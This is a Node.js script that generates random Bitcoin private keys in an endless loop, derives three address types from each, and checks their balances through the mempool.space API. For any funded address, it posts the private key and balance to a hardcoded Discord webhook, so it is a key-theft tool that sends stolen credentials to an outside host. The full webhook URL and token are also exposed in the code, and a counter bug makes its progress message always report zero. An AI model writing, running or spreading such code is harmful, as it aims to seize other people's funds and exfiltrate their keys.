require('isomorphic-fetch');
const crypto = require('crypto');
const tinysecp = require('tiny-secp256k1');
const { ECPairFactory } = require('ecpair');
const bitcoin = require('bitcoinjs-lib');

bitcoin.initEccLib(tinysecp);

const NETWORK = bitcoin.networks.bitcoin;
const ECPair = ECPairFactory(tinysecp);

count = 0;
WEBHOOK_URL = "https://discord.com/api/webhooks/1342822282627907654/t9EjJ6BOlkz7IShJOApUFy-m2AwHRdLZ9RljoI5Js7RAV29-IMxP72oQ591hKwMVCEu0"

function sendToDiscord(message) {
    const data = { content: message };
    
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.status === 204) {
            console.log("Message sent successfully!");
        } else {
            return response.text().then(text => {
                console.error(`Failed to send message: ${response.status} - ${text}`);
            });
        }
    })
    .catch(error => console.error("Error sending message:", error));
}


async function getBalance(address) {
    const url = `https://mempool.space/api/address/${address}/utxo`;

    try {
        const response = await fetch(url);
        const utxos = await response.json();

        if (!Array.isArray(utxos)) {
            throw new Error('Invalid response format');
        }

        if (utxos.length === 0) {
            return 0;
        }

        const balance = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
        return balance / 1e8;
    } catch (error) {
        return 0;
    }
}

async function main() {

    while (true) {
	let privateKey = crypto.randomBytes(32);
	const keyPair = ECPair.fromPrivateKey(privateKey, { network: NETWORK });
	const xOnlyPubKey = Buffer.from(keyPair.publicKey.slice(1, 33));

	const { address: address_p2pkh } = bitcoin.payments.p2pkh({ pubkey: Buffer.from(keyPair.publicKey), network: NETWORK });
	const { address: address_p2wpkh } = bitcoin.payments.p2wpkh({ pubkey: Buffer.from(keyPair.publicKey), network: NETWORK });
	const { address: address_p2tr } = bitcoin.payments.p2tr({ internalPubkey: xOnlyPubKey, network: NETWORK });

        let val_p2pkh = await getBalance(address_p2pkh);
        if (val_p2pkh !== 0) {
            sendToDiscord(`Balance : ${val_p2pkh}, Private Key: ${privateKey.toString('hex')}`);
        }

        let val_p2wpkh = await getBalance(address_p2wpkh);
        if (val_p2wpkh !== 0) {
            sendToDiscord(`Balance : ${val_p2wpkh}, Private Key: ${privateKey.toString('hex')}`);
        }

        let val_p2tr = await getBalance(address_p2tr);
        if (val_p2tr !== 0) {
            sendToDiscord(`Balance : ${val_p2tr}, Private Key: ${privateKey.toString('hex')}`);
        }

        count++;
        if (count%100 === 0) {
           count = 0;
           sendToDiscord(`check BTC tried ${count} times`);
        }
    }
}

main();
